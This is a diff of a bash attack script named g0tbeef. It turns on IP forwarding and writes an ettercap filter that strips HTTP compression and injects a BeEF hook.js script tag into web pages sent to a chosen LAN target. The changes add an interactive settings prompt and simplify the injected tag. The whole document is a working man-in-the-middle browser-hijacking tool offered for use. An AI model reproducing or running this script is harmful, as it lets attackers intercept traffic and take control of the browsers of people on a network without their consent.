@@ -16,8 +16,7 @@ Usage:  g0tbeef <options>
 		-t <ip>   ~  ip extension to target
 		-r <ip>   ~  remote beef server
 		-p <port> ~  port of beef server
-		-e        ~  external ip address for beef server
-
+		
 Examples:
 	g0tbeef -t 2								
 	  ~  Attack "$LAN"2 beef hook: $MYI:3000/hook.js
@@ -31,28 +30,14 @@ ACNT=1																	#Parse command line arguments
 for ARG in $@
 do
 	ACNT=$((ACNT + 1))
-	case $ARG in "-h")fhelp;;"--help")fhelp;;"-e")EXTR=1;;"-r")IP=$(echo $@ | cut -d " " -f $ACNT);;"-p")PORT=$(echo $@ | cut -d " " -f $ACNT);;"-t")TARG=$(echo $@ | cut -d " " -f $ACNT);esac
+	case $ARG in "-h")fhelp;;"--help")fhelp;;"-r")IP=$(echo $@ | cut -d " " -f $ACNT);;"-p")PORT=$(echo $@ | cut -d " " -f $ACNT);;"-t")TARG=$(echo $@ | cut -d " " -f $ACNT);esac
 done
 
 if [ $IP -z ] 2> /dev/null
 then
-	if [ $EXTR -z ] 2> /dev/null
-	then
-		IP=$(ifconfig | grep $LAN | cut -d ':' -f 2 | cut -d ' ' -f 1)
-	else
-		echo " [*] Retrieving external IP address.."
-		IP=$(curl -s ifconfig.me)
-		if [ $IP -z ] 2> /dev/null
-		then
-			echo
-			echo " [*] ERROR: could not retrieve external IP address"
-			exit
-		else
-			echo
-			echo " [*] External IP: $IP"
-		fi
-	fi
+	IP=$MYI
 fi
+
 if [ $PORT -z ] 2> /dev/null
 then
 	PORT=3000
@@ -68,6 +53,24 @@ then
 else
 	TARG=$LAN$TARG
 fi
+echo """ [*] We detected these settings:
+Your IP: $IP
+Your Router: $ROUTE
+Your Network: $LAN
+Interface: $NIC
+Target: $TARG
+"
+read -p " [>] Is this correct? [Y/n]: " PROC
+if [ $PROC = 'y' ] 2> /dev/null || [ $PROC = 'Y' ] 2> /dev/null
+then
+	A=1
+else
+	read -p " [>] Please enter your IP: " IP
+	read -p " [>] Please enter Your Router: " ROUTE
+	read -p " [>] Please enter your Network: " LAN
+	read -p " [>] Please enter your Interface: " NIC
+	read -p " [>] Please enter your Target: " TARG
+fi
 echo 1 > /proc/sys/net/ipv4/ip_forward
 echo 'if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
@@ -76,7 +79,7 @@ echo 'if (ip.proto == TCP && tcp.dst == 80) {
    }
 }
 if (ip.proto == TCP && tcp.src == 80) {
-   replace("</head>", "<script type="text/javascript" src="http://'"$IP"':'"$PORT"'/hook.js"> </script> </head>");
+   replace("</head>", "<script src=http://'"$IP"':'"$PORT"'/hook.js></script></head>");
    msg("Beef Hook: '"$IP"':'"$PORT"'/hook.js Injected!\n");
 }' > etter.filter.jsinject
 
